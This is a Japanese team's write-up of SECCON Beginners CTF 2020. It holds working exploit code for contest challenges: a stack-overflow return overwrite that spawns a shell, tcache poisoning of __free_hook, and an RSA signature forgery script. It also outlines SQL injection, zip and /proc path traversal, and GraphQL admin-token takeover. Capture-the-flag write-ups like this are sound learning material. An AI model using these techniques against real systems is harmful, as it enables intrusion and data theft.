---
title: "SECCON Beginners CTF 2020 Write-up"
date: "2020-05-24T23:27:00+09:00"
author: "mayth"
categories: ["Write-ups"]
---

<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>

2020-05-23 14:00 - 2020-05-24 14:00 (JST)に開催された[SECCON Beginners CTF 2020](https://www.seccon.jp/2019/seccon_beginners/seccon_beginners_ctf_2020_5_23_1400.html)のwrite-upです。

なお、今回は以下のメンバー編成で参加しました。

* yuscarlet
* mayth
* yyu
* favcastle

## Pwn

### Beginner's Stack

> Let's learn how to abuse stack overflow!

64bit ELFのバイナリが与えられる。これがサーバーで動いている。

実行すると

> ```
> Your goal is to call `win` function (located at 0x400861)
> 
>    [ Address ]           [ Stack ]
>                    +--------------------+
> 0x00007ffeb1443ac0 | 0x00007f30a003dfc8 | <-- buf
>                    +--------------------+
> 0x00007ffeb1443ac8 | 0x0000000000400ad0 |
>                    +--------------------+
> 0x00007ffeb1443ad0 | 0x0000000000400ad0 |
>                    +--------------------+
> 0x00007ffeb1443ad8 | 0x00007f30a0078190 |
>                    +--------------------+
> 0x00007ffeb1443ae0 | 0x00007ffeb1443af0 | <-- saved rbp (vuln)
>                    +--------------------+
> 0x00007ffeb1443ae8 | 0x000000000040084e | <-- return address (vuln)
>                    +--------------------+
> 0x00007ffeb1443af0 | 0x0000000000000000 | <-- saved rbp (main)
>                    +--------------------+
> 0x00007ffeb1443af8 | 0x00007f309fe740b3 | <-- return address (main)
>                    +--------------------+
> 0x00007ffeb1443b00 | 0x0000000100000001 |
>                    +--------------------+
> 0x00007ffeb1443b08 | 0x00007ffeb1443be8 |
>                    +--------------------+
> ```

といった感じに目標と現時点のスタックフレームが示される親切設計となっている。ついでに目的の`win`関数では、`system("/bin/sh")`を呼び出してくれる。つまり`win`関数を呼べれば自動的にシェルが取れる。

さて、IDAで実行ファイルを見てみると、`vuln`という関数で入力を受け付けて`buf`に格納していることがわかる。このとき、`buf`は`0x20`(32)byteしかない一方で、`read`関数を呼ぶときに入力サイズを`0x200`に設定していて、ここでスタックオーバーフローが発生する。これを使って"return address (vuln)"となっている箇所を書き換えればよい。飛び先となる`win`関数のアドレスは分かっているし、"return address"までの長さも分かっているので、次のような入力を与える（エンディアンに注意）。

```
$ perl -e 'print "A"x40 . "\x61\x08\x40"' | ./chall
```

これは失敗する。

> ```
> Oops! RSP is misaligned!
> Some functions such as `system` use `movaps` instructions in libc-2.27 and later.
> This instruction fails when RSP is not a multiple of 0x10.
> Find a way to align RSP! You're almost there!
> ```

というわけで、`rsp`（スタックポインタ）が`0x10`の倍数になっていないといけない。スタックポインタは8byteずつ動くので、`push`/`pop`が呼び出される回数を1回増やすか減らすかする。

`win`関数があるという`0x400861`だが、これは関数の先頭、すなわち`push rbp`を指している。これによってズレているのだとすれば、この命令を飛ばせばよいはずである。`push rbp`の直後の`0x400862`を書き込むようにする。

```
$ perl -e 'print "A"x40 . "\x62\x08\x40"' | ./chall
...
Congratulations!
```

祝福されたものの即座に終了してしまう。試しに`nc`で実際の問題サーバーに投げ込んでも、同様に応答が返ってこなくなる。これで1時間以上は潰していたのだが、神の助言によって`strace`をしてみると、どうも`system("/bin/sh")`は呼べているがttyが取れなくて死んでいるようだった。

どうしたものか悩んだところで、そういえばpwntoolsに`interactive`とかいうメソッド生えてなかったっけ、これでttyの代わりにならんか、と思い出してpwntoolsを使ってみる。

```python
from pwn import *

context.arch = 'amd64'

io = process('chall')

vuln_ret = pack(0x400862)
io.sendline(b'A' * 40 + vuln_ret)
io.interactive()
```

これを実行すると無事に対話的にコマンドが打てるようになった。接続先を問題サーバーにして実行し、対話環境に入ったところでフラグを`cat`した。

### Beginner's Heap

この問題を解くにあたってはこちらの記事が大変参考になった: [t\-cache poisoning: FireShell CTF 2019 babyheap \- ふるつき](https://furutsuki.hatenablog.com/entry/2019/02/26/112207)

さて、こちらはバイナリがない。`nc`で問題サーバーに繋ぐとこんな表示が現れる。

> ```
> Let's learn heap overflow today
> You have a chunk which is vulnerable to Heap Overflow (chunk A)
>
>  A = malloc(0x18);
>
> Also you can allocate and free a chunk which doesn't have overflow (chunk B)
> You have the following important information:
>
>  <__free_hook>: 0x7fe9b33978e8
>  <win>: 0x56491d3be465
>
> Call <win> function and you'll get the flag.
>
> 1. read(0, A, 0x80);
> 2. B = malloc(0x18); read(0, B, 0x18);
> 3. free(B); B = NULL;
> 4. Describe heap
> 5. Describe tcache (for size 0x20)
> 6. Currently available hint
> ```

この対話環境を操作し、ヒープオーバーフローを使って`win`関数を呼び出すのが目標となる。なお、`__free_hook`と`win`関数のアドレスは毎回変化する（検証のために再実行を繰り返しているため、以下のコンソール出力の例示では`__free_hook`だとするアドレスが変化しているが、その辺りはよしなに読み替えてほしい）。

`A`は`0x18`byteしかない一方で、1の操作で`0x80`byteまで書くことができる。`B`にはオーバーフローの脆弱性はないが、2の操作で`malloc`して書き込み、3の操作で`free`ができる。残りはヒープ状態の表示、tcacheの状態の表示、そしてヒントの表示である。

何はともあれヒントを見てみる。

> ```
> Tcache manages freed chunks in linked lists by size.
> Every list can keep up to 7 chunks.
> A freed chunk linked to tcache has a pointer (fd) to the previously freed chunk.
> Let's check what happens when you overwrite fd by Heap Overflow.
> ```

まず2でBを`malloc`して適当な値を書き込み、3で`free`する。この時点で4/5を実行すると次のような状態であることがわかる。

> ```
> -=-=-=-=-= HEAP LAYOUT =-=-=-=-=-
>  [+] A = 0x558bbf3eb330
>  [+] B = (nil)
>                    +--------------------+
> 0x0000558bbf3eb320 | 0x0000000000000000 |
>                    +--------------------+
> 0x0000558bbf3eb328 | 0x0000000000000021 |
>                    +--------------------+
> 0x0000558bbf3eb330 | 0x0000000000000000 | <-- A
>                    +--------------------+
> 0x0000558bbf3eb338 | 0x0000000000000000 |
>                    +--------------------+
> 0x0000558bbf3eb340 | 0x0000000000000000 |
>                    +--------------------+
> 0x0000558bbf3eb348 | 0x0000000000000021 |
>                    +--------------------+
> 0x0000558bbf3eb350 | 0x0000000000000000 |
>                    +--------------------+
> 0x0000558bbf3eb358 | 0x0000000000000000 |
>                    +--------------------+
> 0x0000558bbf3eb360 | 0x0000000000000000 |
>                    +--------------------+
> 0x0000558bbf3eb368 | 0x0000000000020ca1 |
>                    +--------------------+
> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
> ```

> ```
> -=-=-=-=-= TCACHE -=-=-=-=-=
> [    tcache (for 0x20)    ]
>         ||
>         \/
> [ 0x0000558bbf3eb350(rw-) ]
>         ||
>         \/
> [      END OF TCACHE      ]
> -=-=-=-=-=-=-=-=-=-=-=-=-=-=
> ```

ヒントにあった`fd`が`0x0000558bbf3eb350`（元々`B`があった場所）になっている。
この状態で`malloc`を行うと確保されたアドレスとして`0x0000558bbf3eb350`が返ってくるのだが、ヒープレイアウトを見てわかる通り、この領域は`A`のヒープオーバーフローによって書き換えられる。とりあえず目標の`0x0000558bbf3eb350`を`__free_hook`のアドレスに書き換えてみる。先ほどの教訓を生かして最初からpwntoolsを使うことにした。

```python
p.sendline(b'X' * 0x20 + p64(free_hook_addr))
```

これでヒントを見るとチャンクサイズが壊れているか大きすぎると言われる。

> ```
> It seems __free_hook is successfully linked to tcache!
> But the chunk size is broken or too big maybe...?
> ```

> ```
> -=-=-=-=-= TCACHE -=-=-=-=-=
> [    tcache (for 0x20)    ]
>         ||
>         \/
> [ 0x0000556bb204b350(rw-) ]
>         ||
>         \/
> [ 0x00007fe2b3efe8e8(rw-) ]
>         ||
>         \/
> [      END OF TCACHE      ]
> -=-=-=-=-=-=-=-=-=-=-=-=-=-=
> ```

`fd`の直前8byteがチャンクサイズなのだが、先ほどの入力では`0x5858585858585858`になっている。これを適当に`0x20`にするとヒントが変わる。

```python
p.sendlineafter("> ", '1')
p.sendline(b'X' * 0x18 + p64(0x20) + p64(free_hook_addr))
```

> ```
> It seems __free_hook is successfully linked to tcache!
> But you can't get __free_hook since you can only malloc/free B.
> What if you change the chunk size to a value other than 0x20...?
> ```

あまりに大きすぎると先ほどのように壊れていると言われるので、`0x30`にすると次の段階になった。

> ```
> It seems __free_hook is successfully linked to tcache!
> And the chunk size is properly forged!
> ```

ここでもう一度`B`の`malloc`と書き込みを行う。ここで書き込む内容はなんでもよい。

```python
p.sendlineafter("> ", '2')
p.sendline(b'X' * 0x10)
```

この段階でのヒントはこんな感じ。

> ```
> It seems __free_hook is successfully linked to tcache!
> The first link of tcache is __free_hook!
> But B is not empty...
> ```

`B`を`free`して空にしてみる。

> ```
> It seems __free_hook is successfully linked to tcache!
> The first link of tcache is __free_hook!
> Also B is empty! You know what to do, right?
> ```

ここでtcacheの状態を見てみると、`B`を`free`したのにここに追加されておらず、`__free_hook`のアドレスだけが残っていることがわかる。

> ```
> -=-=-=-=-= TCACHE -=-=-=-=-=
> [    tcache (for 0x20)    ]
>         ||
>         \/
> [ 0x00007fc20362c8e8(rw-) ]
>         ||
>         \/
> [      END OF TCACHE      ]
> -=-=-=-=-=-=-=-=-=-=-=-=-=-=
> ```

最初のヒントには以下の記載があった。

> ```
> Tcache manages freed chunks in linked lists by size.
> ```

また、冒頭に挙げた記事にも次の記載がある。

> 定数TCACHE_MAX_BINSはデフォルトでは64になっていて、キャッシュされるサイズは0x18, 0x28, 0x38, ..., 0x408バイト以下というように区切られています。

つまり、先ほどチャンクサイズを`0x30`ということにしたため、今`malloc`して`free`した`B`はtcacheの別のリストに追加された、ということだと思う（たぶん）。

さて、この状態になると次の`malloc`では`__free_hook`のアドレスが返ってくる。`__free_hook`は`free`したときに呼び出される関数へのポインタである。したがって、今`malloc`して返ってきた領域に`win`関数のアドレスを書き込んで`free`を呼ぶと、代わりに`win`関数が呼び出される。最後に出力を表示するのを忘れずに。

```python
p.sendlineafter('> ', '2')
p.sendline(pack(win_addr))

p.sendlineafter('> ', '3')

log.info(p.recvline_contains("ctf4b"))
```

## Crypto

### R&B
先頭の文字を見て、Bならbase64decode、RならROT13decodeを繰り返す。

### Noisy equations

下記のPythonプログラムが動いている。

```python
from os import getenv
from time import time
from random import getrandbits, seed


FLAG = getenv("FLAG").encode()
SEED = getenv("SEED").encode()

L = 256
N = len(FLAG)


def dot(A, B):
    assert len(A) == len(B)
    return sum([a * b for a, b in zip(A, B)])

coeffs = [[getrandbits(L) for _ in range(N)] for _ in range(N)]

seed(SEED)

answers = [dot(coeff, FLAG) + getrandbits(L) for coeff in coeffs]

print(coeffs)
print(answers)
```

この変数`FLAG`の内容を知ることができればOKという問題。
`answers`が表示されているが、これには乱数`getrandbits(L)`が加算されているので、
2回分のデータを使っていくという方法がある。
いま1回目の結果得られた`coeffs`を\\(C_1\\)、そして2回目を\\(C_2\\)とすると、
これらは次のような行列である。

$$
\\begin{align\*}
C_1 &= \\left\[
\\begin{array}{cccc}
c^1\_{1,1} & c^1\_{1,2} & \dots & c^1\_{1,44} \\\\\
\vdots & \ddots &  & \vdots \\\\\
\vdots &  & \ddots  & \vdots \\\\\
c^1\_{44,1} & c^1\_{44,2} & \dots & c^1{44,44}
\\end{array}
\\right\] \\\\\
\\\\\
C_2 &= \\left\[
\\begin{array}{cccc}
c^2\_{1,1} & c^2\_{1,2} & \dots & c^2\_{1,44} \\\\\
\vdots & \ddots &  & \vdots \\\\\
\vdots &  & \ddots  & \vdots \\\\\
c^2\_{44,1} & c^2\_{44,2} & \dots & c^2\_{44,44}
\\end{array}
\\right\]
\\end{align\*}
$$

そして`answer`は1回目を\\(A_1\\)、そして2回目を\\(A_2\\)とすると次のようになる。

$$
\\begin{align\*}
A_1 &= \\left\[
\\begin{array}{c}
a^1\_{1} \\\\\
\vdots \\\\\
a^1\_{44}
\\end{array}
\\right\] \\\\\
\\\\\
A_2 &= \\left\[
\\begin{array}{c}
a^2\_{1} \\\\\
\vdots \\\\\
a^2\_{44}
\\end{array}
\\right\]
\\end{align\*}
$$

ここで\\(a^1\_{i} - a^2\_{i}\\)について考える。求めたい`FLAG`の1文字目から\\(x\_1, \\dots, x\_{44}\\)とすると、

$$
a^1\_{i} = \\left(\\sum^{44}\_{j=1}{C^1\_{i,j} \\times x\_j}\\right) + R_i
$$

であり、この\\(R_i\\)は`getrandbits(L)`だがPythonプログラムを見ると、シードを固定しているため、
どんな値なのかよく分からないが毎回同じ結果になる。
したがって、\\(a^1\_{i} - a^2\_{i}\\)は次のように\\(R_i\\)がキャンセルされる。

$$
a^1\_{i} - a^2\_{i} = \\left(\\sum^{44}\_{j=1}{C^1\_{i,j} \\times x\_j}\\right) -
  \\left(\\sum^{44}\_{j=1}{C^2\_{i,j} \\times x\_j}\\right)
$$

したがってこれを行列表現すると

$$
\\left\[
\\begin{array}{c}
a^1\_{1} - a^2\_{1} \\\\\
\vdots \\\\\
a^1\_{44} - a^2\_{44}
\\end{array}
\\right\] = \\left\[
\\begin{array}{cccc}
c^1\_{1,1} - c^2\_{1,1} & c^1\_{1,2} - c^2\_{1,2} & \dots & c^1\_{1,44} - c^2\_{1,44} \\\\\
\vdots & \ddots &  & \vdots \\\\\
\vdots &  & \ddots  & \vdots \\\\\
c^1\_{44,1} - c^2\_{44,1} & c^1\_{44,2} - c^2\_{44,2} & \dots & c^1\_{44,44} - c^2_{44,44}
\\end{array}
\\right\]
\\left\[
\\begin{array}{c}
x\_{1} \\\\\
\vdots \\\\\
x\_{44}
\\end{array}
\\right\]
$$

したがってあとは\\(C\_1 - C\_2\\)の逆行列から`FLAG`を得られる。

```python
import os
import json
import numpy as np
from numpy.linalg import inv

stream = os.popen("nc noisy-equations.quals.beginners.seccon.jp 3000")

coeffs1 = json.loads(stream.readline())
answer1 = json.loads(stream.readline())

stream2 = os.popen("nc noisy-equations.quals.beginners.seccon.jp 3000")

coeffs2 = json.loads(stream2.readline())
answer2 = json.loads(stream2.readline())

coeff_diffs =np.matrix(
    [ [ c1 - c2 for (c1, c2) in zip(c1s, c2s) ] for (c1s, c2s) in zip(coeffs1, coeffs2)  ],
    dtype = 'float'
)

answer_diffs = np.transpose(
        np.matrix(
            [ a1 - a2 for (a1, a2) in zip(answer1, answer2) ],
            dtype = 'float'
        )
)

coeff_diffs_inv = inv(
    np.matrix(coeff_diffs, dtype = 'float')
)
flag = np.transpose(np.linalg.solve(coeff_diffs, answer_diffs))

flag_int = np.around(flag).astype(int).tolist()[0]

print(flag)

print( "".join([ chr(i) for i in flag_int ]) )
```

### RSA Calc

下記のようなプログラムが動いている。

```python
from Crypto.Util.number import *
from params import p, q, flag
import binascii
import sys
import signal


N = p * q
e = 65537
d = inverse(e, (p-1)*(q-1))


def input(prompt=''):
    sys.stdout.write(prompt)
    sys.stdout.flush()
    return sys.stdin.buffer.readline().strip()

def menu():
    sys.stdout.write('''----------
1) Sign
2) Exec
3) Exit
''')
    try:
        sys.stdout.write('> ')
        sys.stdout.flush()
        return int(sys.stdin.readline().strip())
    except:
        return 3


def cmd_sign():
    data = input('data> ')
    if len(data) > 256:
        sys.stdout.write('Too long\n')
        return

    if b'F' in data or b'1337' in data:
        sys.stdout.write('Error\n')
        return

    signature = pow(bytes_to_long(data), d, N)
    sys.stdout.write('Signature: {}\n'.format(binascii.hexlify(long_to_bytes(signature)).decode()))

def cmd_exec():
    data = input('data> ')
    signature = int(input('signature> '), 16)

    if signature < 0 or signature >= N:
        sys.stdout.write('Invalid signature\n')
        return

    check = long_to_bytes(pow(signature, e, N))
    if data != check:
        sys.stdout.write('Invalid signature\n')
        return

    chunks = data.split(b',')
    stack = []
    for c in chunks:
        if c == b'+':
            stack.append(stack.pop() + stack.pop())
        elif c == b'-':
            stack.append(stack.pop() - stack.pop())
        elif c == b'*':
            stack.append(stack.pop() * stack.pop())
        elif c == b'/':
            stack.append(stack.pop() / stack.pop())
        elif c == b'F':
            val = stack.pop()
            if val == 1337:
                sys.stdout.write(flag + '\n')
        else:
            stack.append(int(c))

    sys.stdout.write('Answer: {}\n'.format(int(stack.pop())))


def main():
    sys.stdout.write('N: {}\n'.format(N))
    while True:
        try:
            command = menu()
            if command == 1:
                cmd_sign()
            if command == 2:
                cmd_exec()
            elif command == 3:
                break
        except:
            sys.stdout.write('Error\n')
            break


if __name__ == '__main__':
    signal.alarm(60)
    main()
```

`F`または`1337`を含まないならば、任意の文字列に署名してくれる。そしてスタック署名されたスタックマシンの命令列を実行し、狙ったところに入れる（そのために`F`や`1337`が必要）ことができればフラグが入手できる。
RSAの準同型性を利用した。端的にいうと、いまRSAのパラメーターとして\\(N, e, d\\)と、任意の平文\\(m\_1, m\_2\\)があるとして、RSAは次がなりたつ。

$$
\\text{Sign}\_{d, N}(m\_1 \times m\_2) \\equiv \\text{Sign}\_{d, N}(m\_1) \\times \\text{Sign}\_{d, N}(m\_2) \\bmod N
$$

よって次のようなプランでアタックする。

1. \\(2\\)に署名させる
2. \\(\\frac{\\mathtt{1337,F}}{2}\\)した値に署名させる
    - 偶然`1337,F`の数値表現は\\(2\\)で割り切ることができた
3. 上記2つの署名をかけ算して\\(N\\)で割った余りをとる
    - これが`1337,F`の署名となっている
4. `1337,F`を実行し、署名として（3）で得られたものを入れる

これをやるのが下記のプログラムである。

```python
import numpy as np
import re
import socket
from Crypto.Util.number import *

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("rsacalc.quals.beginners.seccon.jp", 10001))
data = s.recv(4096).decode("utf-8")
data_n = re.search('N: (\d+)\n', data).group(1)

N = int(data_n)

print("N: " + str(N))

command = bytes_to_long(b'1337,F')
half_command = int(command / 2)

print("command: " + str(command))

# Get `2` signature
s.sendall(b'1\n')
print(s.recv(1024).decode("utf-8"))

s.sendall(b'\02\n')

signature_2 = int(
    re.search('Signature: ([\da-f]+)', s.recv(4096).decode("utf-8")).group(1),
    16
)

print("signature_2: " + str(signature_2))

# Get `half_command` signature
s.sendall(b'1\n')
print(s.recv(1024).decode("utf-8"))

s.sendall(
    half_command.to_bytes((half_command.bit_length() + 7) , byteorder='big', signed=False) + b'\n'
)

signature_half_command = int(
    re.search('Signature: ([\da-f]+)', s.recv(4096).decode("utf-8")).group(1),
    16
)

print("signature half command: " + str(signature_half_command))

# Calculate signature
signature_command = signature_half_command * signature_2 % N

print("GOOOOOOOOOOOOOOOOOO")

# Execute command
s.sendall(b'2\n')
print(s.recv(1024).decode("utf-8"))
s.sendall(b'1337,F\n')
print(s.recv(1024).decode("utf-8"))
sig = (format(signature_command, 'x')).encode("ascii")

s.sendall(sig + b'\n\n')

print(s.recv(2024).decode("utf-8"))
```

## Web

### Spy
ユーザの有無でサーバの応答時間が変わるので、全ユーザー試して列挙。

### Tweetstore
SQLインジェクションでユーザ情報を表示する。

### unzip
解凍後に../../../../../../../../../flag.txtを展開するzipをアップロード。

### profiler
Burp Suiteで通信を覗くと、APIでGraphQLが使われていることがわかる。
AltairというChrome拡張機能でGraphQLのクエリを送ることができる。
利用できそうなAPIを探すと、他の人のprofileが覗けそうなsomeoneとトークンをアップデートできそうなupdateTokenが見つかる。
someoneでuid:adminを指定してリクエストすると、adminのTokenが参照できる。
ここで手に入れた値をupdateTokenで指定すると、自分のTokenがadminと同じトークンに変更できる。
この状態でflagページにアクセスすると、flagが表示される。

## Reversing

### mask
Ghidraに食わせると、flagの各文字を& 0x75した文字列と& 0xebした文字列が見つかるので、これらの論理和を計算。

### yakisoba
Ghidraに食わせると、flagの各文字を判定する関数が見つかるので、読む。

### ghost
実装が与えられているので、総当たり。

## Misc

### Welcome
Discordを見る。

### emoemoencode
絵文字の文字コードの下2桁をasciiにする。

### readme
/proc/self/environでpwdが/home/ctf/serverとわかるので、/proc/self/cwd/../flagを渡し、相対パスでアクセス。
